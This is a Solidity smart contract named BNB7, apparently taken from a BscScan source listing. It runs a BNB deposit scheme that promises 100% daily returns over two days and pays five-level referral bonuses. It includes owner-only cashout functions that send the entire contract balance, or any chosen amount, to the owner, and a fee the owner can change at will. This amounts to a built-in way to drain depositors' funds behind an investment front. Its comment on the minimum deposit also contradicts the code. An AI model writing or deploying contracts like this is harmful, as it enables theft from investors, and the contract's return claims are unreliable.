/**
 *Submitted for verification at BscScan.com on 2022-05-07
*/

pragma solidity 0.5.10;

contract Owned {
    address public owner;

    event OwnershipTransferred(address indexed _from, address indexed _to);

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}


contract BNB7 is Owned {
    using SafeMath for uint256;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event WithdrawReferalsBonus(address indexed user, uint256 amount);
    event WithdrawDeposit(address indexed user, uint256 index, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);


    uint256 public totalInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 start;
        uint256 checkpoint;
    }

    struct Action {
        uint8 types;
        uint256 amount;
        uint256 date;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[5] levels;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;
        Action[] actions;
    }

    mapping(address => User) internal users;

    bool public started;
    address payable public commissionWallet;


    uint256[] public REFERRAL_PERCENTS = [70, 30, 15, 10, 5];
    uint256 public INVEST_MIN_AMOUNT = 1e16; // 0.05 bnb
    uint256 public PROJECT_FEE = 100;
    uint256 constant public TOTAL_REF = 130;
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;


    function changeMin(uint256 _value) public onlyOwner{
        INVEST_MIN_AMOUNT = _value;
    }

    function changeFee(uint256 _value) public onlyOwner{
        PROJECT_FEE = _value;
    }

    function changeComissionWallet(address payable wallet) public onlyOwner {
        require(!isContract(wallet), "Wallet is a contract");
        commissionWallet = wallet;
    }

    function cashout() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function cashout(uint256 _value) public onlyOwner{
        msg.sender.transfer(_value);
    }



    constructor(address payable wallet) public {
        require(!isContract(wallet));
        commissionWallet = wallet;

        // plans.push(Plan(20, 200)); // 20 days, 200 - 20% perday
        plans.push(Plan(2, 1000)); // 2 days, 1000 - 100% perday

    }

    function invest(address referrer) public payable {
        uint8 plan = 0;
        if (!started) {
            if (msg.sender == commissionWallet) {
                started = true;
            } else revert("Not started yet");
        }

        require(msg.value >= INVEST_MIN_AMOUNT);
        require(plan < 1, "Invalid plan");

        uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        commissionWallet.transfer(fee);
        emit FeePayed(msg.sender, fee);

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i] = users[upline].levels[i].add(1);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint256 i = 0; i < 5; i++) {
                if (upline != address(0)) {
                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    users[upline].bonus = users[upline].bonus.add(amount);
                    users[upline].totalBonus = users[upline].totalBonus.add(amount);
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(plan, msg.value, block.timestamp, block.timestamp));
        user.actions.push(Action(0, msg.value, block.timestamp));

        totalInvested = totalInvested.add(msg.value);

        emit NewDeposit(msg.sender, plan, msg.value);
    }

    // function withdraw() public {
    //     User storage user = users[msg.sender];
    //
    //     uint256 totalAmount = getUserDividends(msg.sender);
    //
    //     uint256 referralBonus = getUserReferralBonus(msg.sender);
    //     if (referralBonus > 0) {
    //         user.bonus = 0;
    //         totalAmount = totalAmount.add(referralBonus);
    //     }
    //
    //     require(totalAmount > 0, "User has no dividends");
    //
    //     uint256 contractBalance = address(this).balance;
    //     if (contractBalance < totalAmount) {
    //         user.bonus = totalAmount.sub(contractBalance);
    //         user.totalBonus = user.totalBonus.add(user.bonus);
    //         totalAmount = contractBalance;
    //     }
    //
    //     user.checkpoint = block.timestamp;
    //     user.withdrawn = user.withdrawn.add(totalAmount);
    //
    //     msg.sender.transfer(totalAmount);
    //     user.actions.push(Action(1, totalAmount, block.timestamp));
    //
    //     emit Withdrawn(msg.sender, totalAmount);
    // }

    function withdrawreferalsbonus() public {
        User storage user = users[msg.sender];
        uint256 referralBonus = getUserReferralBonus(msg.sender);
        uint256 contractBalance = address(this).balance;

        require(referralBonus > 0, "User has no referal payments");
        require(contractBalance > referralBonus , "No enought balance. Try later");

        if (referralBonus > 0) {
            user.bonus = 0;
        }
        user.withdrawn = user.withdrawn.add(referralBonus);

        msg.sender.transfer(referralBonus);
        user.actions.push(Action(2, referralBonus, block.timestamp));
        emit WithdrawReferalsBonus(msg.sender, referralBonus);
    }

    function withdrawdeposit(uint256 index) public {
       
        User storage user = users[msg.sender];

        uint256 amount = getUserDepositProfit(msg.sender, index);
        require(amount > 0, "No deposit amount");
        user.deposits[index].checkpoint = block.timestamp;
        user.withdrawn = user.withdrawn.add(amount);

        msg.sender.transfer(amount);
        user.actions.push(Action(3, amount, block.timestamp));
        emit WithdrawDeposit(msg.sender, index, amount);
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getPlanInfo() public view returns (uint256 time, uint256 percent) {
        time = plans[0].time;
        percent = plans[0].percent;
    }

    // function getUserDividends(address userAddress) public view returns (uint256) {
    //     User storage user = users[userAddress];
    //
    //     uint256 totalAmount;
    //
    //     for (uint256 i = 0; i < user.deposits.length; i++) {
    //         uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
    //         if (user.checkpoint < finish) {
    //             uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
    //             uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
    //             uint256 to = finish < block.timestamp ? finish : block.timestamp;
    //             if (from < to) {
    //                 totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
    //             }
    //         }
    //     }
    //
    //     return totalAmount;
    // }



    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].withdrawn;
    }

    function getUserCheckpoint(address userAddress) public view returns (uint256) {
        return users[userAddress].checkpoint;
    }

    function getUserReferrer(address userAddress) public view returns (address) {
        return users[userAddress].referrer;
    }

    function getUserDownlineCount(address userAddress) public view returns (uint256[5] memory referrals) {
        return (users[userAddress].levels);
    }

    function getUserTotalReferrals(address userAddress) public view returns (uint256) {
        return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2] + users[userAddress].levels[3] + users[userAddress].levels[4];
    }

    function getUserReferralBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].bonus;
    }

    function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus;
    }

    function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
        return users[userAddress].totalBonus.sub(users[userAddress].bonus);
    }

    // function getUserAvailable(address userAddress) public view returns (uint256) {
    //     return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
    // }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount.add(users[userAddress].deposits[i].amount);
        }
        return amount;
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns (uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish, uint256 checkpoint, uint256 withdrawn, uint256 profit) {
        // uint256 index = 0;
        User storage user = users[userAddress];

        plan = user.deposits[index].plan;
        percent = plans[plan].percent;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        checkpoint = user.deposits[index].checkpoint;
        withdrawn = 0;
        profit = 0;

        if (checkpoint < finish) { // timestamp начисления - не позже finish = значит есть начисления
            // сколько начисления в день
            uint256 share = user.deposits[index].amount.mul(plans[user.deposits[index].plan].percent).div(PERCENTS_DIVIDER);
            // сколько снято
            withdrawn = share.mul(checkpoint.sub(start)).div(TIME_STEP);
            // timestamp откуда начислять
            uint256 from = user.deposits[index].start > user.deposits[index].checkpoint ? user.deposits[index].start : user.deposits[index].checkpoint;
            // timestamp докуда начислять
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            // сумма начислений за дни (но примерная ж - или дробь?)
            if (from < to) {
                profit = share.mul(to.sub(from)).div(TIME_STEP);
            }
        }
    }

    function getUserDepositProfit(address userAddress, uint256 index) public view returns (uint256) {
        // uint256 index = 0;
        User storage user = users[userAddress];

        uint256 plan = user.deposits[index].plan;
        uint256 percent = plans[plan].percent;
        uint256 amount = user.deposits[index].amount;
        uint256 start = user.deposits[index].start;
        uint256 finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
        uint256 checkpoint = user.deposits[index].checkpoint;
        uint256 profit = 0;

        if (checkpoint < finish) { // timestamp начисления - не позже finish = значит есть начисления
            // сколько начисления в день
            uint256 share = amount.mul(percent).div(PERCENTS_DIVIDER);
            // timestamp откуда начислять
            uint256 from = start > checkpoint ? start : checkpoint;
            // timestamp докуда начислять
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            // сумма начислений за дни (но примерная ж - или дробь?)
            if (from < to) {
                profit = share.mul(to.sub(from)).div(TIME_STEP);
            }
        }
        return profit;
    }

    function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
        require(index > 0, "wrong index");
        User storage user = users[userAddress];
        uint256 start;
        uint256 end;
        uint256 cnt = 50;


        start = (index - 1) * cnt;
        if (user.actions.length < (index * cnt)) {
            end = user.actions.length;
        }
        else {
            end = index * cnt;
        }

        uint8[]   memory types = new  uint8[](end - start);
        uint256[] memory amount = new  uint256[](end - start);
        uint256[] memory date = new  uint256[](end - start);

        for (uint256 i = start; i < end; i++) {
            types[i - start] = user.actions[i].types;
            amount[i - start] = user.actions[i].amount;
            date[i - start] = user.actions[i].date;
        }
        return
        (
            types,
            amount,
            date
        );
    }


    function getUserActionLength(address userAddress) public view returns (uint256) {
        return users[userAddress].actions.length;
    }

    function getSiteInfo() public view returns (uint256 _totalInvested, uint256 _totalBonus) {
        return (totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER));
    }

    function getUserInfo(address userAddress) public view returns (uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals) {
        return (getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress));
    }

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly {size := extcodesize(addr)}
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}